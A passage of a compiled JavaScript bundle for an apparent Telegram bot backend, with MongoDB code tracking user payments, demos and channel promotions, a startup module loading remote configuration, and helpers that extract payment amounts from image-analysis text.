    user["highestPayAmount"] = "highestPayAmount";
    user["cheatCount"] = "cheatCount";
    user["fullShow"] = "fullShow";
    user["callTime"] = "callTime";
})(user || (exports.user = user = {}));
class UserDataDtoCrud {
    constructor() {
        this.clients = {};
        this.isConnected = false;
        this.client = undefined;
        console.log("Creating MongoDb Instance");
    }
    static getInstance() {
        if (!UserDataDtoCrud.instance) {
            UserDataDtoCrud.instance = new UserDataDtoCrud();
        }
        return UserDataDtoCrud.instance;
    }
    static isInstanceExist() {
        return !!UserDataDtoCrud.instance;
    }
    connect() {
        return __awaiter(this, void 0, void 0, function* () {
            if (!this.client && !this.isConnected) {
                console.log('trying to connect to DB......');
                try {
                    this.client = yield mongodb_1.MongoClient.connect(process.env.mongodburi, { useNewUrlParser: true, useUnifiedTopology: true, maxPoolSize: 10 });
                    console.log('Connected to MongoDB');
                    this.isConnected = true;
                    this.db = this.client.db("tgclients").collection('userData');
                    this.statsDb = this.client.db("tgclients").collection('stats');
                    this.statsDb2 = this.client.db("tgclients").collection('stats2');
                    this.activeChannelDb = this.client.db("tgclients").collection('activeChannels');
                    this.promoteStatsDb = this.client.db("tgclients").collection('promoteStats');
                    const clients = yield this.client.db("tgclients").collection('clients').find({}).toArray();
                    this.client.on('close', () => {
                        console.log('MongoDB connection closed.');
                        this.isConnected = false;
                    });
                    clients.forEach(clt => {
                        this.clients = Object.assign(this.clients, { [clt.dbcoll]: clt });
                    });
                    yield this.updatePromoteStats('mock');
                    return true;
                }
                catch (error) {
                    console.log(`Error connecting to MongoDB: ${error}`);
                    return false;
                }
            }
            else {
                console.log('MongoConnection ALready Existing');
            }
        });
    }
    checkIfUserAlreadyExists(chatId) {
        return __awaiter(this, void 0, void 0, function* () {
            const document = yield this.db.findOne({ chatId });
            if (document) {
                return true;
            }
            return false;
        });
    }
    textedClientCount(chatId) {
        return __awaiter(this, void 0, void 0, function* () {
            try {
                const documents = yield this.db.find({ chatId, client: { $ne: process.env.clientId } }).toArray();
                const lastdayProfiles = getRecentProfiles(documents, 24 * 60 * 60 * 1000, 6);
                const lastHourProfiles = getRecentProfiles(documents, 30 * 60 * 1000, 1);
                let count = 0;
                const profiles = documents.map(item => item.profile);
                const profileslastDay = lastdayProfiles.map(item => item.profile);
                const profileslastHour = lastHourProfiles.map(item => item.profile);
                const twoDaysAgo = Date.now() - (1 * 24 * 60 * 60 * 1000);
                for (const doc of documents) {
                    if (doc.payAmount > 9) {
                        count = count - 20;
                    }
                    else {
                        if (doc.canReply == 0) {
                            count = count + 20;
                        }
                        else if (doc.lastMsgTimeStamp > twoDaysAgo) {
                            count++;
                        }
                    }
                }
                const res = { count, list: profiles, lastDay: profileslastDay, lastHour: profileslastHour };
                console.log(res);
                return res;
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
                return { count: 1, list: [], lastDay: [], lastHour: [] };
            }
        });
    }
    checkIfPaidToOthers(chatId) {
        return __awaiter(this, void 0, void 0, function* () {
            const resp = { paid: '', demoGiven: '' };
            try {
                const document = yield this.db.find({ chatId, profile: { $exists: true, "$ne": `${process.env.dbcoll}` }, payAmount: { $gte: 10 } }).toArray();
                const document2 = yield this.db.find({ chatId, profile: { $exists: true, "$ne": `${process.env.dbcoll}` }, demoGiven: true }).toArray();
                if (document.length > 0) {
                    document.map((doc) => {
                        var _a;
                        resp.paid = resp.paid + `@${(_a = this.clients[doc.profile]) === null || _a === void 0 ? void 0 : _a.username}` + ", ";
                    });
                }
                if (document2.length > 0) {
                    document.map((doc) => {
                        var _a;
                        resp.demoGiven = resp.demoGiven + `@${(_a = this.clients[doc.profile]) === null || _a === void 0 ? void 0 : _a.username}` + ", ";
                    });
                }
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
            }
            return resp;
        });
    }
    getClientFirstNames() {
        var _a, _b;
        const names = [];
        for (const client in this.clients) {
            if (client.toLowerCase() !== process.env.dbcoll.toLowerCase()) {
                names.push((_a = this.clients[client]) === null || _a === void 0 ? void 0 : _a.dbcoll.toLowerCase());
                names.push((_b = this.clients[client]) === null || _b === void 0 ? void 0 : _b.product.toLowerCase());
            }
        }
        return names;
    }
    create(data) {
        return __awaiter(this, void 0, void 0, function* () {
            const result = yield this.db.findOne({ chatId: data.chatId, profile: process.env.dbcoll });
            if (result) {
                return result;
            }
            else {
                const userData = Object.assign(Object.assign({}, data), { profile: `${process.env.dbcoll}` });
                const result = yield this.db.insertOne(userData);
                console.log(`New userData created for: ${data.username} | ${data.chatId}`);
                return result.insertedId;
            }
        });
    }
    createOrUpdateStats(chatId, name, payAmount, newUser, demoGiven, paidReply, secondShow, didPay) {
        return __awaiter(this, void 0, void 0, function* () {
            try {
                const filter = { chatId, client: process.env.clientId, profile: process.env.dbcoll };
                const chat = yield this.statsDb.findOne(filter);
                const chat2 = yield this.statsDb2.findOne(filter);
                if (chat) {
                    yield this.statsDb.updateOne(filter, { $set: { count: chat.count + 1, payAmount: payAmount, didPay: didPay, demoGiven: demoGiven, paidReply, secondShow } });
                }
                else {
                    yield this.statsDb.insertOne({ chatId, count: 1, payAmount, demoGiven: demoGiven, demoGivenToday: false, newUser, name, secondShow, didPay: false, paidReply, client: process.env.clientId, profile: process.env.dbcoll });
                }
                if (chat2) {
                    yield this.statsDb2.updateOne(filter, { $set: { count: chat2.count + 1, payAmount: payAmount, didPay: didPay, demoGiven: demoGiven, paidReply, secondShow } });
                }
                else {
                    yield this.statsDb2.insertOne({ chatId, count: 1, payAmount, demoGiven: demoGiven, demoGivenToday: false, newUser, paidReply, name, secondShow, didPay: false, client: process.env.clientId, profile: process.env.dbcoll });
                    const textedClientCount = yield this.textedClientCount(chatId);
                    if (textedClientCount.lastHour.length > 2) {
                        setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                            yield this.updateSingleKey(chatId, user.limitTime, Date.now() + (2 * 60 * 60 * 1000));
                        }), 20000);
                    }
                    const userDetail = yield this.read(chatId);
                    if (userDetail) {
                        if ((userDetail === null || userDetail === void 0 ? void 0 : userDetail.payAmount) > 20) {
                            if (userDetail === null || userDetail === void 0 ? void 0 : userDetail.demoGiven) {
                                yield this.updateSingleKey(chatId, user.paidReply, true);
                            }
                            else {
                                yield this.updateSingleKey(chatId, user.paidReply, false);
                            }
                        }
                        else {
                            yield this.updateSingleKey(chatId, user.paidReply, true);
                        }
                    }
                }
            }
            catch (error) {
                (0, parseError_1.parseError)(error, "Creating/updating stats", false);
            }
        });
    }
    updateStatSingleKey(chatId, mykey, value) {
        return __awaiter(this, void 0, void 0, function* () {
            const filter = { chatId, profile: process.env.dbcoll, client: process.env.clientId };
            yield this.statsDb.updateOne(filter, { $set: { [mykey]: value } }, { upsert: true, returnDocument: 'after' });
            yield this.statsDb2.updateOne(filter, { $set: { [mykey]: value } }, { upsert: true, returnDocument: 'after' });
        });
    }
    delete(chatId) {
        return __awaiter(this, void 0, void 0, function* () {
            const result = yield this.db.deleteMany({ chatId, profile: process.env.dbcoll });
        });
    }
    read(chatId) {
        return __awaiter(this, void 0, void 0, function* () {
            const result = yield this.db.findOne({ chatId, profile: process.env.dbcoll });
            if (result) {
                return result;
            }
            else {
                return undefined;
            }
        });
    }
    getAChannel() {
        return __awaiter(this, void 0, void 0, function* () {
            const result = yield this.promoteStatsDb.findOne({ client: process.env.clientId });
            let lowestKey;
            let lowestValue;
            const data = result.data;
            for (const [key, value] of Object.entries(data.data)) {
                if (lowestValue === null || value < lowestValue) {
                    lowestKey = key;
                    lowestValue = value;
                }
            }
            return lowestKey;
        });
    }
    ;
    addTodaysChannels(data) {
        return __awaiter(this, void 0, void 0, function* () {
            const clientId = process.env.clientId;
            const result = yield this.promoteStatsDb.updateOne({ client: clientId }, {
                $set: {
                    channels: data
                },
            }, { upsert: true });
        });
    }
    updatePromoteStats(channelName) {
        return __awaiter(this, void 0, void 0, function* () {
            channelName = channelName || "null";
            try {
                const clientId = process.env.clientId;
                const existingDocument = yield this.promoteStatsDb.findOne({ client: clientId });
                let count = 0;
                let data = {};
                let totalCount = 0;
                if (existingDocument) {
                    count = existingDocument.count + 1;
                    data = existingDocument.data;
                    totalCount = existingDocument.totalCount;
                }
                if (data[channelName]) {
                    data[channelName]++;
                }
                else {
                    data[channelName] = 1;
                }
                totalCount++;
                const uniqueChannels = Object.keys(data).length;
                // const sortedDataEntries = Object.entries(data).sort((a, b) => b[1] - a[1]);
                // const sortedData = Object.fromEntries(sortedDataEntries);
                const result = yield this.promoteStatsDb.updateOne({ client: clientId }, {
                    $set: {
                        totalCount: totalCount,
                        data: data, //sortedData,
                        uniqueChannels: uniqueChannels,
                        lastUpdatedTimeStamp: Date.now(),
                        releaseDay: Date.now(),
                        isActive: true
                    },
                }, { upsert: true });
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
            }
        });
    }
    activatePromotions() {
        return __awaiter(this, void 0, void 0, function* () {
            const clientId = process.env.clientId;
            const result = yield this.promoteStatsDb.updateOne({ client: clientId }, {
                $set: {
                    releaseDay: Date.now(),
                    isActive: true
                },
            }, { upsert: true });
        });
    }
    deactivatePromotions() {
        return __awaiter(this, arguments, void 0, function* (day = Date.now()) {
            const clientId = process.env.clientId;
            const result = yield this.promoteStatsDb.updateOne({ client: clientId }, {
                $set: {
                    releaseDay: day,
                    isActive: false
                },
            }, { upsert: true });
        });
    }
    readPromoteStats() {
        return __awaiter(this, void 0, void 0, function* () {
            const result = yield this.promoteStatsDb.findOne({ "client": process.env.clientId });
            return result;
        });
    }
    readPromoteStatsTime() {
        return __awaiter(this, void 0, void 0, function* () {
            const result = yield this.promoteStatsDb.findOne({ "client": process.env.clientId }, { projection: { "client": 1, "totalCount": 1, "lastUpdatedTimeStamp": 1, "isActive": 1, "_id": 0 } });
            return result;
        });
    }
    readstats() {
        return __awaiter(this, void 0, void 0, function* () {
            const result = yield this.statsDb.find({ client: process.env.clientId }).sort({ newUser: -1 });
            if (result) {
                return result.toArray();
            }
            else {
                return undefined;
            }
        });
    }
    readstats2() {
        return __awaiter(this, void 0, void 0, function* () {
            const result = yield this.statsDb2.find({ client: process.env.clientId }).sort({ newUser: -1 });
            if (result) {
                return result.toArray();
            }
            else {
                return [];
            }
        });
    }
    readstats2Opt() {
        return __awaiter(this, void 0, void 0, function* () {
            return yield this.statsDb2.aggregate([
                { $match: { client: process.env.clientId } },
                {
                    $group: {
                        _id: null,
                        totalCount: { $sum: "$count" },
                        userCount: { $sum: 1 }
                    }
                }
            ]).toArray();
        });
    }
    getTodayPaidUsers() {
        return __awaiter(this, void 0, void 0, function* () {
            try {
                const result = yield this.statsDb2.find({ client: process.env.clientId, payAmount: { $gt: 10 } });
                if (result) {
                    const res = yield result.toArray();
                    let newUsers = 0;
                    for (const u of res) {
                        if (u.true) {
                            newUsers++;
                        }
                    }
                    return ({ total: res.length || 0, new: newUsers || 0 });
                }
                else {
                    return ({ total: 0, new: 0 });
                }
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
                return ({ total: 0, new: 0 });
            }
        });
    }
    checkIfPaidTodayToOthers(chatId) {
        return __awaiter(this, void 0, void 0, function* () {
            const result = yield this.statsDb2.find({ chatId: chatId, client: { $ne: `${process.env.clientId}` } }).sort({ newUser: -1 });
            if (result) {
                const res = result.toArray();
                if (res.length > 0) {
                    return true;
                }
                return false;
            }
            else {
                return false;
            }
        });
    }
    readSingleStats(chatId) {
        return __awaiter(this, void 0, void 0, function* () {
            const result = yield this.statsDb.find({ chatId, client: process.env.clientId, profile: process.env.dbcoll }).sort({ newUser: -1 });
            if (result) {
                return result.toArray();
            }
            else {
                return undefined;
            }
        });
    }
    removeSingleStat(chatId) {
        return __awaiter(this, void 0, void 0, function* () {
            try {
                const result = yield this.statsDb.deleteMany({ chatId, profile: process.env.dbcoll, client: process.env.clientId });
            }
            catch (error) {
                console.log("Unable to delete");
            }
        });
    }
    readRecentPaidPpl() {
        return __awaiter(this, void 0, void 0, function* () {
            const result = yield this.statsDb.find({ client: process.env.clientId, payAmount: { $gt: 26 } });
            if (result) {
                return result.toArray();
            }
            else {
                return undefined;
            }
        });
    }
    readRecentPaidPpl2() {
        return __awaiter(this, void 0, void 0, function* () {
            const result = yield this.statsDb2.find({ client: process.env.clientId, payAmount: { $gt: 25 } });
            if (result) {
                return result.toArray();
            }
            else {
                return undefined;
            }
        });
    }
    todayPaidPpl() {
        return __awaiter(this, void 0, void 0, function* () {
            const result = yield this.statsDb2.find({ client: process.env.clientId, newUser: true, payAmount: { $gt: 25 } });
            if (result) {
                return result.toArray();
            }
            else {
                return undefined;
            }
        });
    }
    getPaidList() {
        return __awaiter(this, void 0, void 0, function* () {
            let ppl = '';
            const result = yield this.db.find({ payAmount: { $gt: 26 } }).sort({ lastMsgTimeStamp: -1 }).limit(25).toArray();
            if (result) {
                result.forEach((element) => {
                    ppl = ppl + '\n ' + (element === null || element === void 0 ? void 0 : element.username) + ' : ' + (element === null || element === void 0 ? void 0 : element.paidCount) + "|" + (element === null || element === void 0 ? void 0 : element.payAmount);
                });
                return ppl;
            }
            else {
                return undefined;
            }
        });
    }
    getPaidListIds() {
        return __awaiter(this, void 0, void 0, function* () {
            let ppl = [];
            const result = yield this.db.find({ payAmount: { $gt: 26 } }).sort({ lastMsgTimeStamp: -1 }).limit(25).toArray();
            if (result) {
                result.forEach((element) => __awaiter(this, void 0, void 0, function* () {
                    const id = (element === null || element === void 0 ? void 0 : element.username.startsWith("@")) ? element === null || element === void 0 ? void 0 : element.username : element === null || element === void 0 ? void 0 : element.chatId;
                    ppl.push({ userId: id, accessHash: element.accessHash, paidReply: element.paidReply, payAmount: element.payAmount });
                    // const chatId = element.chatId
                    // const result = await this.db.updateOne({ chatId }, { $set: { limitTime: Date.now() + (3 * 60 * 60 * 1000) } });
                }));
                return ppl;
            }
            else {
                return undefined;
            }
        });
    }
    // Update a UserDataDto in the database by chatId
    update(chatId, updates) {
        return __awaiter(this, void 0, void 0, function* () {
            if (!chatId || !updates) {
                console.log("ChatId or updates are undefined");
                return;
            }
            try {
                const result = yield this.db.findOneAndUpdate({ chatId, profile: process.env.dbcoll }, { $set: Object.assign(Object.assign({}, updates), { lastMsgTimeStamp: Date.now() }) }, { upsert: true, returnDocument: 'after' });
                return (result === null || result === void 0 ? void 0 : result.value) || result || (yield this.read(chatId));
            }
            catch (error) {
                (0, parseError_1.parseError)(error, "Error updating UserDataDto", false);
                console.log(`Error updating UserDataDto for chatId: ${chatId}`, error);
                return yield this.read(chatId);
            }
        });
    }
    resetUnpaid() {
        return __awaiter(this, void 0, void 0, function* () {
            const result = yield this.db.updateMany({ lastMsgTimeStamp: { $lt: Date.now() - 30 * 24 * 60 * 60 * 1000 }, profile: process.env.dbcoll, "paidCount": { $gt: 0 }, "payAmount": 0 }, { $set: { paidCount: 0 } });
            return result;
        });
    }
    resetPpl() {
        return __awaiter(this, void 0, void 0, function* () {
            const result = yield this.db.updateMany({}, { $set: { paidReply: true } });
            return result;
        });
    }
    remove(chatId) {
        return __awaiter(this, void 0, void 0, function* () {
            const result = yield this.db.deleteMany({ chatId, profile: process.env.dbcoll });
        });
    }
    getSingleKey(chatId, key) {
        return __awaiter(this, void 0, void 0, function* () {
            const result = yield this.db.findOne({ chatId, profile: process.env.dbcoll }, { projection: { [key]: 1 } });
            if (result) {
                return result[key];
            }
            else {
                return undefined;
            }
        });
    }
    updateSingleKey(chatId, key, value) {
        return __awaiter(this, void 0, void 0, function* () {
            const result = yield this.db.findOneAndUpdate({ chatId, profile: process.env.dbcoll }, { $set: { [key]: value, lastMsgTimeStamp: Date.now() } }, { upsert: true, returnDocument: 'after' });
            return result === null || result === void 0 ? void 0 : result.value;
        });
    }
    updateVideos(chatId, video) {
        return __awaiter(this, void 0, void 0, function* () {
            const result = yield this.db.updateOne({ chatId, profile: process.env.dbcoll }, {
                $push: { videos: video },
                $set: { callTime: Date.now() - 5 * 60000 }
            });
        });
    }
    getPromoteMsgs() {
        return __awaiter(this, void 0, void 0, function* () {
            try {
                const channelDb = this.client.db("tgclients").collection('promoteMsgs');
                return yield channelDb.findOne({});
            }
            catch (e) {
                console.log(e);
            }
        });
    }
    updateClient(filter, data) {
        return __awaiter(this, void 0, void 0, function* () {
            try {
                const clientsDb = this.client.db("tgclients").collection('clients');
                return yield clientsDb.updateOne(filter, { $set: data });
            }
            catch (error) {
                (0, parseError_1.parseError)(error, "Error updating Client");
            }
        });
    }
    removeFromAvailableMsgs(filter, valueToRemove) {
        return __awaiter(this, void 0, void 0, function* () {
            try {
                return yield this.activeChannelDb.updateOne(filter, { $pull: { availableMsgs: valueToRemove } });
            }
            catch (error) {
                console.log(error, "RemoveChannelMsgErr");
            }
        });
    }
    addToAvailableMsgs(filter, valueToAdd) {
        return __awaiter(this, void 0, void 0, function* () {
            try {
                return yield this.activeChannelDb.updateOne(filter, { $addToSet: { availableMsgs: valueToAdd } });
            }
            catch (error) {
                console.log(error, "AddChannelMsgErr");
            }
        });
    }
    updateTimestamps() {
        return __awaiter(this, void 0, void 0, function* () {
            try {
                if (this.client) {
                    const collection = this.client.db("tgclients").collection('timestamps');
                    const result = yield collection.updateOne({}, { $set: { [process.env.clientId]: Date.now() } }, { upsert: true });
                    return result;
                }
            }
            catch (error) {
                (0, parseError_1.parseError)(error, "Error updating timestamps");
            }
        });
    }
    // async getAvgCalculatedChannels() {
    //     const channelStatsDb = this.client.db("tgclients").collection('channelStats');
    //     const results = await channelStatsDb.find({ averageCalculated: true }, { projection: { channelId: 1, _id: 0 } }).toArray();
    //     const ids = [];
    //     results.map(doc => {
    //         ids.push(doc.channelId)
    //     })
    //     return ids;
    // } 
    // async saveChannelStatsToDB(chatRequestCounts: { [chatId: string]: number }): Promise<void> {
    //     try {
    //         const channelStatsDb = this.client.db("tgclients").collection('channelStats');
    //         // Calculate the time 1 minutes ago
    //         for (const chatId in chatRequestCounts) {
    //             const channelId = chatId.replace(/^-100/, "")
    //             const existingStats = await channelStatsDb.findOne({ channelId });
    //             const oneMinutesAgo = new Date(Date.now() - 1 * 60 * 1000);
    //             if (!existingStats || existingStats?.updatedAt <= oneMinutesAgo) {
    //                 const requestCount: number = chatRequestCounts[chatId];
    //                 const chatStats = await channelStatsDb.updateOne(
    //                     { channelId },
    //                     {
    //                         $push: { requestCounts: requestCount },
    //                         $set: { updatedAt: Date.now() }
    //                     },
    //                     { upsert: true }
    //                 );
    //             }
    //             chatRequestCounts[chatId] = 0;
    //         }
    //     } catch (error) {
    //         parseError(error)
    //     }
    // }
    updateActiveChannel(filter, data) {
        return __awaiter(this, void 0, void 0, function* () {
            delete data["_id"];
            return yield this.activeChannelDb.updateOne(filter, {
                $set: Object.assign({}, data),
            }, { upsert: true });
        });
    }
    getChannel(filter) {
        return __awaiter(this, void 0, void 0, function* () {
            const channelDb = this.client.db("tgclients").collection('channels');
            const result = yield channelDb.findOne(filter);
            return result;
        });
    }
    getActiveChannel(filter) {
        return __awaiter(this, void 0, void 0, function* () {
            const result = yield this.activeChannelDb.findOne(filter);
            return result;
        });
    }
    removeOnefromActiveChannel(channelId) {
        return __awaiter(this, void 0, void 0, function* () {
            try {
                yield this.activeChannelDb.deleteOne({ channelId });
            }
            catch (e) {
                console.log(e);
            }
        });
    }
    removeOnefromChannel(channelId) {
        return __awaiter(this, void 0, void 0, function* () {
            try {
                const channelDb = this.client.db("tgclients").collection('channels');
                yield channelDb.deleteOne({ channelId });
            }
            catch (e) {
                console.log(e);
            }
        });
    }
    closeConnection() {
        return __awaiter(this, void 0, void 0, function* () {
            var _a;
            try {
                if (this.isConnected) {
                    this.isConnected = false;
                    console.log('MongoDB connection closed.');
                }
                yield ((_a = this.client) === null || _a === void 0 ? void 0 : _a.close());
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
            }
        });
    }
}
exports.UserDataDtoCrud = UserDataDtoCrud;
function getRecentProfiles(data, time, expectedCount) {
    const currentTime = Date.now();
    const oldTime = currentTime - time;
    const filteredData = data.filter(item => {
        const condition = ((item.lastMsgTimeStamp > oldTime) && (item.totalCount > expectedCount) && (item.payAmount < 10));
        return (condition);
    });
    return filteredData;
}


/***/ }),

/***/ "./src/entry.ts":
/*!**********************!*\
  !*** ./src/entry.ts ***!
  \**********************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
(__webpack_require__(/*! dotenv */ "dotenv").config)();
console.log("in Entry.ts");
const child_process_1 = __webpack_require__(/*! child_process */ "child_process");
const Config_1 = __webpack_require__(/*! ./Config */ "./src/Config.ts");
const UpiClass_1 = __webpack_require__(/*! ./UpiClass */ "./src/UpiClass.ts");
const fs_1 = __importDefault(__webpack_require__(/*! fs */ "fs"));
const path_1 = __importDefault(__webpack_require__(/*! path */ "path"));
const readPackageJson = () => {
    try {
        const packageJsonPath = path_1.default.resolve(__dirname, '../package.json');
        const packageJsonContent = fs_1.default.readFileSync(packageJsonPath, 'utf-8');
        return JSON.parse(packageJsonContent);
    }
    catch (error) {
        console.error('Error reading package.json:', error.message);
        throw error;
    }
};
const writePackageJson = (data) => {
    try {
        const packageJsonPath = path_1.default.resolve(__dirname, '../package.json');
        const packageJsonContent = JSON.stringify(data, null, 2);
        fs_1.default.writeFileSync(packageJsonPath, packageJsonContent, 'utf-8');
    }
    catch (error) {
        console.error('Error writing package.json:', error.message);
        throw error;
    }
};
const modifyPackageJson = (action, packageName, version, dev = false) => {
    let packageJson;
    try {
        packageJson = readPackageJson();
    }
    catch (error) {
        console.error('Failed to load package.json. Exiting...');
        return;
    }
    const section = dev ? 'devDependencies' : 'dependencies';
    switch (action) {
        case 'add':
            if (!version) {
                console.error('Version is required to add a package.');
                return;
            }
            if (!packageJson[section])
                packageJson[section] = {};
            packageJson[section][packageName] = version;
            break;
        case 'remove':
            if (packageJson[section] && packageJson[section][packageName]) {
                delete packageJson[section][packageName];
            }
            else {
                console.error(`Package ${packageName} not found in ${section}.`);
                return;
            }
            break;
        case 'change':
            if (packageJson[section] && packageJson[section][packageName]) {
                if (!version) {
                    console.error('Version is required to change a package.');
                    return;
                }
                packageJson[section][packageName] = version;
            }
            else {
                console.error(`Package ${packageName} not found in ${section}.`);
                return;
            }
            break;
        default:
            console.error(`Unknown action: ${action}`);
            return;
    }
    try {
        writePackageJson(packageJson);
        console.log(`Package ${packageName} has been ${action}ed successfully!`);
    }
    catch (error) {
        console.error('Failed to update package.json.');
    }
};
// modifyPackageJson('change', 'telegram', '2.16.4');
// modifyPackageJson('add', "node-schedule", "^2.1.1");
// modifyPackageJson('add', "@types/node-schedule", "^2.1.7", true);
//installPackage();
function installPackage() {
    return __awaiter(this, void 0, void 0, function* () {
        console.log(" executing npm i");
        (0, child_process_1.execSync)("npm i");
        // const installProcess = spawn('npm', ['install']);
        // installProcess.stdout.on('data', (data) => console.log(data.toString()));
        // installProcess.stderr.on('data', (data) => console.error(data.toString()));
        // await new Promise((resolve) => installProcess.on('close', resolve));
    });
}
(0, Config_1.getDataAndSetEnvVariables)(`https://api.npoint.io/7c2682f37bb93ef486ba/${process.env.clientId}`).then(() => __awaiter(void 0, void 0, void 0, function* () {
    yield (0, Config_1.getDataAndSetEnvVariables)("https://api.npoint.io/cc57d60feea67e47b6c4");
    yield (0, UpiClass_1.setUpiIds)();
    __webpack_require__(/*! ./app */ "./src/app.ts");
}));


/***/ }),

/***/ "./src/helpers/customImage.ts":
/*!************************************!*\
  !*** ./src/helpers/customImage.ts ***!
  \************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.processChatGptResponse = processChatGptResponse;
exports.getNumberFromString = getNumberFromString;
exports.customanalyseImage = customanalyseImage;
const fetchWithTimeout_1 = __webpack_require__(/*! ../utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const utils_1 = __webpack_require__(/*! ../utils */ "./src/utils.ts");
const gemini_1 = __webpack_require__(/*! ./gemini */ "./src/helpers/gemini.ts");
const parseError_1 = __webpack_require__(/*! ../utils/parseError */ "./src/utils/parseError.ts");
const logbots_1 = __webpack_require__(/*! ../utils/logbots */ "./src/utils/logbots.ts");
function processChatGptResponse(text) {
    return __awaiter(this, void 0, void 0, function* () {
        let returnText = { amount: 0, text: text };
        let match = text ? text === null || text === void 0 ? void 0 : text.match(/\d+/) : ["0"];
        let number = match ? parseInt(match[0]) : 0;
        returnText.amount = number;
        console.log("chatgptAm: ", number);
        if (number < 10 || number > 1000) {
            number = getNumberFromString(text);
        }
        switch (number) {
            case 825:
            case 725:
            case 225:
            case 815:
            case 715:
            case 215:
            case 820:
            case 720:
            case 220:
                returnText.amount = 25;
                break;
            case 250:
            case 850:
            case 750:
                returnText.amount = 50;
                break;
            case 8100:
            case 7100:
            case 2100:
                returnText.amount = 100;
                break;
            case 8150:
            case 7150:
            case 2150:
                returnText.amount = 150;
                break;
            case 8200:
            case 7200:
            case 2200:
                returnText.amount = 200;
                break;
            case 8250:
            case 7250:
            case 2250:
                returnText.amount = 250;
                break;
            case 8300:
            case 7300:
            case 2300:
                returnText.amount = 300;
                break;
            case 8350:
            case 7350:
            case 2350:
                returnText.amount = 350;
                break;
            default:
                returnText.amount = number;
                break;
        }
        console.log("returning: ", returnText);
        return returnText;
    });
}
const getCurrentDayOfMonth = () => {
    const currentDate = new Date();
    const timezoneOffset = 5.5 * 60 * 60 * 1000; // India's timezone offset in milliseconds (IST: UTC+5:30)
    const indiaTime = new Date(currentDate.getTime() + timezoneOffset);
    return indiaTime.getDate();
};
function getNumberFromString(input) {
    if (input) {
        const symbols = ['₹', '€', '¥', '₽', '£', 'e', '*'];
        const todayDate = getCurrentDayOfMonth();
        const regex = new RegExp(`(?:^|\\s)(?:${todayDate == 25 ? '' : '25|225|725|'}215|715|r15|50|r50|750|250|r150|r100|7150|2150|7100|r200|r250|2100|r350|r300|7350|2350|7250|2250|7200|2200|7300)\\b`, 'g');
        for (let symbol of symbols) {
            let symbolRegex;
            if (symbol == "*") {
                symbolRegex = /\*\s*([0-9]+)/;
            }
            else {
                symbolRegex = new RegExp(`(${symbol})\\s*(\\d+\\b)`);
            }
            const lines = input.split('\n');
            for (let line of lines) {
                line = line.replace(/\*{3}(\d+)/, ' hst');
                if (line.includes(symbol) && !line.includes('***')) {
                    const match = line.match(symbolRegex);
                    if (match) {
                        for (let i = 0; i < match.length; i++) {
                            const numberMatch = match[i].match(/\d+/);
                            if (numberMatch && numberMatch[0]) {
                                return parseInt(numberMatch[0]);
                            }
                        }
                    }
                }
            }
        }
        const lines = input.split('\n');
        for (let line of lines) {
            const match = line.match(regex);
            if (match) {
                for (let i = 0; i < match.length; i++) {
                    const numberMatch = match[i].match(/\d+/);
                    if (numberMatch && numberMatch[0]) {
                        return parseInt(numberMatch[0]);
                    }
                }
            }
        }
        return 0;
    }
    else {
        return 0;
    }
}
function customanalyseImage(imageId) {
    return __awaiter(this, void 0, void 0, function* () {
        var _a;
        let imageData = {
            amount: 0,
            isPayment: false,
            isFailed: true,
            payeeName: null,
            payerName: null,
            text: 'CustomAnalysis Failed',
            description: '',
            wordCount: 0,
            time: null,
            isFinished: false,
            isSuccess: false,
            isInappropriate: false,
            error: false,
            confidence: 0
        };
        try {
            const response = yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${process.env.chatgptserver}/askGemini?imageId=${imageId}`);
            if ((response === null || response === void 0 ? void 0 : response.status) == 200) {
                console.log(response.data);
                const responseJson = (0, gemini_1.convertToJSON)((_a = response.data) === null || _a === void 0 ? void 0 : _a.data);
                console.log(responseJson);
                responseJson['wordCount'] = (0, gemini_1.countWord)(responseJson.text);
                yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`@${process.env.clientId.toUpperCase()}\nCustomImage Result : ${(0, utils_1.parseObjectToString)(response.data)}`)}`);
                responseJson.amount = responseJson.amount % 25 == 0 ? responseJson.amount : (yield processChatGptResponse(responseJson.text)).amount;
                return (responseJson);
            }
            else {
                imageData.error = true;
            }
        }
        catch (e) {
            console.log(e);
            (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`@${process.env.clientId.toUpperCase()}\nCustomImage : ${(0, parseError_1.parseError)(e).message}`)}`);
            imageData.error = true;
        }
        return imageData;
    });
}


/***/ }),

/***/ "./src/helpers/gemini.ts":
/*!*******************************!*\
  !*** ./src/helpers/gemini.ts ***!
  \*******************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
